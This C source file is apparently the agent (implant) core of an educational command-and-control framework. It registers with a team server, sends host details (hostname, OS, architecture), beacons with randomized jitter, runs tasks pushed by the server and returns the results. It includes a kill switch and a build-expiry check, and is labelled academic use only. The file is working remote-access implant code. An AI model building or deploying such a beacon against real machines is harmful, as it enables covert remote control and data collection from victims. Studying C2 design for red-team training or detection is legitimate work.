/* ==========================================================================
 * agent.c — Agent Core (Beacon Loop & Registration)
 * ==========================================================================
 * Implements the agent lifecycle:
 *   agent_init()  →  agent_run()  →  agent_shutdown()
 *
 * The beacon loop:
 *   1. Connect to the team server (proto_connect)
 *   2. Send REGISTER message, receive REGISTER response
 *   3. Enter beacon loop:
 *      a. Check kill switch
 *      b. Send BEACON
 *      c. Receive response (TASK, BEACON ack, or SHUTDOWN)
 *      d. Dispatch tasks and send RESULTs
 *      e. Sleep with jitter
 *   4. On disconnect, wait and reconnect
 *
 * ACADEMIC/EDUCATIONAL USE ONLY.
 * ========================================================================== */

#include "agent.h"
#include "config.h"
#include "pal.h"
#include "capabilities.h"
#include "safety.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ---- Initialisation --------------------------------------------------- */

void agent_init(agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return;
    }

    memset(ctx, 0, sizeof(agent_ctx_t));
    proto_init(&ctx->proto);

    ctx->beacon_interval = BEACON_INTERVAL;
    ctx->beacon_jitter   = BEACON_JITTER;
    ctx->lab_agent_flag  = 0;
    ctx->running         = 0;
}

/* ---- Registration ----------------------------------------------------- */

int agent_send_register(agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return -1;
    }

    tlv_buffer_t msg;
    if (tlv_buffer_init(&msg, 512) != 0) {
        return -1;
    }

    /* Message type: REGISTER */
    tlv_buffer_add_u16(&msg, TLV_MSG_TYPE, MSG_REGISTER);

    /* Sequence number (starts at 1). */
    tlv_buffer_add_u32(&msg, TLV_SEQUENCE, proto_get_seq(&ctx->proto) + 1);

    /* Timestamp. */
    tlv_buffer_add_i64(&msg, TLV_TIMESTAMP, pal_time_unix());

    /* System information. */
    char hostname[256];
    char os_info[512];
    char arch[64];

    pal_get_hostname(hostname, sizeof(hostname));
    pal_get_os_info(os_info, sizeof(os_info));
    pal_get_arch(arch, sizeof(arch));

    tlv_buffer_add_str(&msg, TLV_HOSTNAME, hostname);
    tlv_buffer_add_str(&msg, TLV_OS_INFO, os_info);
    tlv_buffer_add_str(&msg, TLV_ARCH, arch);
    tlv_buffer_add_str(&msg, TLV_AGENT_NAME, AGENT_NAME);
    tlv_buffer_add_str(&msg, TLV_AGENT_VERSION, AGENT_VERSION);

    /* Send the REGISTER message. */
    int rc = proto_send(&ctx->proto, &msg);
    tlv_buffer_free(&msg);

    if (rc != 0) {
        fprintf(stderr, "[agent] Failed to send REGISTER.\n");
        return -1;
    }

    pal_log("Sent REGISTER to %s:%d", SERVER_HOST, SERVER_PORT);

    /* Receive the REGISTER response. */
    uint8_t *resp_data = NULL;
    size_t   resp_len  = 0;

    if (proto_recv(&ctx->proto, &resp_data, &resp_len) != 0) {
        fprintf(stderr, "[agent] Failed to receive REGISTER response.\n");
        return -1;
    }

    /* Parse the response to extract server configuration. */
    tlv_field_t *fields = NULL;
    size_t field_count  = 0;

    if (tlv_decode_all(resp_data, resp_len, &fields, &field_count) != 0) {
        fprintf(stderr, "[agent] Failed to decode REGISTER response.\n");
        free(resp_data);
        return -1;
    }

    /* Extract agent ID from response. */
    const tlv_field_t *id_field = tlv_find_field(fields, field_count,
                                                  TLV_AGENT_ID);
    if (id_field != NULL && id_field->length > 0) {
        size_t copy_len = id_field->length;
        if (copy_len >= sizeof(ctx->proto.agent_id)) {
            copy_len = sizeof(ctx->proto.agent_id) - 1;
        }
        memcpy(ctx->proto.agent_id, id_field->value, copy_len);
        ctx->proto.agent_id[copy_len] = '\0';
    }

    /* Extract beacon interval if provided by server. */
    const tlv_field_t *interval_field = tlv_find_field(fields, field_count,
                                                       TLV_BEACON_INTERVAL);
    if (interval_field != NULL && interval_field->length >= 4) {
        ctx->beacon_interval = tlv_read_u32_be(interval_field->value);
        pal_log("Server set beacon interval: %u seconds.", ctx->beacon_interval);
    }

    /* Extract jitter if provided. */
    const tlv_field_t *jitter_field = tlv_find_field(fields, field_count,
                                                     TLV_JITTER);
    if (jitter_field != NULL && jitter_field->length >= 4) {
        ctx->beacon_jitter = tlv_read_u32_be(jitter_field->value);
    }

    /* Transition to REGISTERED. */
    proto_transition(&ctx->proto, STATE_REGISTERED);

    pal_log("REGISTERED (id=%s, interval=%u, jitter=%u)",
            ctx->proto.agent_id, ctx->beacon_interval, ctx->beacon_jitter);

    free(fields);
    free(resp_data);
    return 0;
}

/* ---- Beacon ----------------------------------------------------------- */

int agent_send_beacon(agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return -1;
    }

    tlv_buffer_t msg;
    if (tlv_buffer_init(&msg, 256) != 0) {
        return -1;
    }

    tlv_buffer_add_u16(&msg, TLV_MSG_TYPE, MSG_BEACON);
    tlv_buffer_add_u32(&msg, TLV_SEQUENCE, proto_get_seq(&ctx->proto) + 1);
    tlv_buffer_add_i64(&msg, TLV_TIMESTAMP, pal_time_unix());
    tlv_buffer_add_str(&msg, TLV_AGENT_ID, ctx->proto.agent_id);
    tlv_buffer_add_u32(&msg, TLV_BEACON_INTERVAL, ctx->beacon_interval);

    int rc = proto_send(&ctx->proto, &msg);
    tlv_buffer_free(&msg);

    return rc;
}

/* ---- Task handling ---------------------------------------------------- */

int agent_handle_tasks(agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return -1;
    }

    /* Receive a response from the server. */
    uint8_t *data = NULL;
    size_t   data_len = 0;

    if (proto_recv(&ctx->proto, &data, &data_len) != 0) {
        return -1;
    }

    /* Decode the TLV fields. */
    tlv_field_t *fields = NULL;
    size_t field_count  = 0;

    if (tlv_decode_all(data, data_len, &fields, &field_count) != 0) {
        fprintf(stderr, "[agent] Failed to decode server response.\n");
        free(data);
        return -1;
    }

    /* Check message type. */
    const tlv_field_t *msg_type_field = tlv_find_field(fields, field_count,
                                                       TLV_MSG_TYPE);
    uint16_t msg_type = 0;
    if (msg_type_field != NULL && msg_type_field->length >= 2) {
        msg_type = tlv_read_u16_be(msg_type_field->value);
    }

    if (msg_type == MSG_SHUTDOWN) {
        pal_log("Received SHUTDOWN from server.");
        ctx->running = 0;
        free(fields);
        free(data);
        return 0;
    }

    if (msg_type == MSG_ACK || msg_type == MSG_BEACON) {
        /* Empty beacon acknowledgement — no tasks pending. */
        free(fields);
        free(data);
        return 0;
    }

    if (msg_type == MSG_TASK) {
        /* Dispatch the task. */
        tlv_buffer_t result;
        if (tlv_buffer_init(&result, 1024) != 0) {
            free(fields);
            free(data);
            return -1;
        }

        capability_dispatch(ctx, fields, field_count, &result);

        /* Send the result back. */
        tlv_buffer_add_u32(&result, TLV_SEQUENCE,
                           proto_get_seq(&ctx->proto) + 1);
        tlv_buffer_add_str(&result, TLV_AGENT_ID, ctx->proto.agent_id);

        int rc = proto_send(&ctx->proto, &result);
        tlv_buffer_free(&result);

        if (rc != 0) {
            fprintf(stderr, "[agent] Failed to send RESULT.\n");
            free(fields);
            free(data);
            return -1;
        }
    }

    free(fields);
    free(data);
    return 0;
}

/* ---- Jittered sleep --------------------------------------------------- */

void agent_sleep_with_jitter(const agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return;
    }

    uint32_t base = ctx->beacon_interval;
    uint32_t jitter_pct = ctx->beacon_jitter;

    /* Calculate jitter range. */
    uint32_t jitter_range = (base * jitter_pct) / 100;
    int32_t  offset = 0;

    if (jitter_range > 0) {
        /* Random offset in [-jitter_range, +jitter_range]. */
        offset = (int32_t)(rand() % (2 * jitter_range + 1)) -
                 (int32_t)jitter_range;
    }

    int32_t actual = (int32_t)base + offset;
    if (actual < 1) {
        actual = 1;
    }

    pal_sleep_ms((uint32_t)actual * 1000);
}

/* ---- Main run loop ---------------------------------------------------- */

int agent_run(agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return -1;
    }

    /* Seed the random number generator for jitter. */
    srand((unsigned int)pal_time_unix());

    ctx->running = 1;

    while (ctx->running) {
        /* Check kill switch before connecting. */
        if (check_sentinel_file() != 0) {
            pal_log("Kill switch triggered.  Exiting.");
            ctx->running = 0;
            break;
        }

        /* Check build expiry. */
        if (check_build_expiry() != 0) {
            pal_log("Build expired.  Exiting.");
            ctx->running = 0;
            break;
        }

        /* Connect to the team server. */
        proto_init(&ctx->proto);

        if (proto_connect(&ctx->proto, SERVER_HOST, SERVER_PORT) != 0) {
            pal_log("Connection failed.  Retrying after interval...");
            agent_sleep_with_jitter(ctx);
            continue;
        }

        /* Register with the server. */
        if (agent_send_register(ctx) != 0) {
            pal_log("Registration failed.  Retrying...");
            proto_disconnect(&ctx->proto);
            agent_sleep_with_jitter(ctx);
            continue;
        }

        /* Transition to ACTIVE. */
        proto_transition(&ctx->proto, STATE_ACTIVE);

        /* Beacon loop. */
        while (ctx->running &&
               proto_get_state(&ctx->proto) == STATE_ACTIVE) {

            /* Check kill switch each cycle. */
            if (check_sentinel_file() != 0) {
                pal_log("Kill switch triggered during beacon loop.");
                ctx->running = 0;
                break;
            }

            /* Send beacon. */
            if (agent_send_beacon(ctx) != 0) {
                pal_log("Beacon send failed.  Reconnecting...");
                break;
            }

            /* Handle server response (tasks, ack, or shutdown). */
            if (agent_handle_tasks(ctx) != 0) {
                pal_log("Lost connection.  Reconnecting...");
                break;
            }

            /* Sleep with jitter. */
            agent_sleep_with_jitter(ctx);
        }

        /* Disconnect and loop back to reconnect. */
        proto_disconnect(&ctx->proto);

        if (ctx->running) {
            pal_log("Will reconnect after interval...");
            agent_sleep_with_jitter(ctx);
        }
    }

    return 0;
}

/* ---- Shutdown --------------------------------------------------------- */

void agent_shutdown(agent_ctx_t *ctx)
{
    if (ctx == NULL) {
        return;
    }

    ctx->running = 0;

    /* Send SHUTDOWN acknowledgement if still connected. */
    if (proto_get_state(&ctx->proto) != STATE_SHUTDOWN) {
        tlv_buffer_t msg;
        if (tlv_buffer_init(&msg, 128) == 0) {
            tlv_buffer_add_u16(&msg, TLV_MSG_TYPE, MSG_SHUTDOWN);
            tlv_buffer_add_u32(&msg, TLV_SEQUENCE,
                               proto_get_seq(&ctx->proto) + 1);
            tlv_buffer_add_str(&msg, TLV_AGENT_ID, ctx->proto.agent_id);

            proto_send(&ctx->proto, &msg);
            tlv_buffer_free(&msg);
        }
    }

    proto_disconnect(&ctx->proto);
    pal_log("Agent shutdown complete.");
}
